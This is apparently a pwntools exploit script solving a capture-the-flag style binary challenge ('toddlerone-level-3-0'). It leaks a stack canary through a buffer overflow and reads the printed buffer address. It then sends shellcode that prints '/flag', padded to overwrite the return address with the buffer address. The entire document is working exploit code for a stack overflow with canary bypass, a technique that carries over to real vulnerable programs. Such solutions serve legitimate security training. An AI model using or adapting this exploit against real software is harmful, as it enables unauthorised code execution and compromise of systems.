#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-3-0')

io = elf.process()
io.sendline(b"105")
PAYLOAD = b'REPEAT' + (b'A' * 96) + b'XYZ'
io.sendline(PAYLOAD)
io.recvuntil(b'XYZ')
cana = u64(io.recv(7).rjust(8, b'\x00'))
cana = p64(cana)
print(cana)


io.recvuntil(b"The input buffer begins at 0x")
buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))

SHELLCODE = asm(shellcraft.cat('/flag'))
PAYLOAD = SHELLCODE + b'A' * (104 - len(SHELLCODE)) + cana + b'A' * 8 + buff_addr

io.sendline(f'{len(PAYLOAD)}'.encode())
io.sendline(PAYLOAD)
io.interactive()
